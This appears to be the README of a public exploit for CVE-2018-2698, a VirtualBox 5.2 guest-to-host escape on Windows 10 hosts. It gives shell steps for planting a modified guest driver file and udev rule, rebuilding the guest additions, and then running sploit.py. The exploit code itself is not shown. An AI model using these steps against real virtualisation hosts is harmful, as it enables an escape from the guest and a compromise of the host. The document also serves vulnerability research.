# CVE-2018-2698 exploit

Default config exploit for Windows 10 host.
There were actually two seperate vulns, fixed under one CVE, both of which
provide the same primitive: One in vboxVDMACmdExecBpbTransfer, one in
vboxVDMACmdExecBlt.
Details at
https://github.com/phoenhex/files/blob/master/slides/unboxing_your_virtualboxes.pdf

In Ubuntu guest, Windows 10 1709 host, Virtualbox 5.2:

```
$ wget http://download.virtualbox.org/virtualbox/5.1.30/VBoxGuestAdditions_5.1.30.iso
$ sudo mount -o loop -t iso9660 VBoxGuestAdditions_5.1.30.iso /mnt
$ sudo /mnt/VBoxLinuxAdditions.run
$ sudo cp 70-vboxpwn.rules /etc/udev/rules.d
$ sudo cp HGSMIBase.c /usr/src/vboxguest-5.1.30/vboxvideo
$ sudo /mnt/VBoxLinuxAdditions.run --keep --target additions --noexec
$ sudo additions/vboxadd setup
$ sudo reboot
```

Then run `sploit.py`
